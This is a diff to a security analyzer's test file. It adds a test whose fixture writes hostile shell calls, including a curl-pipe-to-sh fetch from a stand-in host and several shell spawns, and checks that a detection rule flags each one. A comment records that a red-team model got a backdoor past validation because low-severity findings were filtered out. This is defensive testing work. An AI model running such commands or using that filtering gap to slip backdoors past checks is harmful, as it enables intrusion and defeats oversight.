@@ -74,3 +74,17 @@ def test_finds_every_planted_vulnerability_in_demo_repo():
 def test_planted_injections_in_demo_repo_are_reported():
     files = {f.path for f in analyze(ROOT / "demo_repo") if f.tool == "injection"}
     assert files == {"README.md", "docs/issues/ISSUE-12.md"}
+
+
+def test_shell_commands_are_flagged_even_with_a_constant_argument(tmp_path):
+    # Bandit rates os.system("<constant>") as low severity, which is filtered out; a backdoor written as
+    # a literal string must still fail validation (found by the red-team, evaluation/redteam_model.py).
+    (tmp_path / "m.py").write_text(
+        "import os\nimport pty\n\n\ndef f():\n"
+        "    os.system('curl -s http://x.example/p.sh | sh')\n"
+        "    os.popen('id')\n"
+        "    os.execvp('sh', ['sh'])\n"
+        "    pty.spawn('/bin/sh')\n"
+    )
+    lines = {f.line for f in analyze(tmp_path) if f.tool == "semgrep" and f.rule == "shell-command"}
+    assert lines == {6, 7, 8, 9}
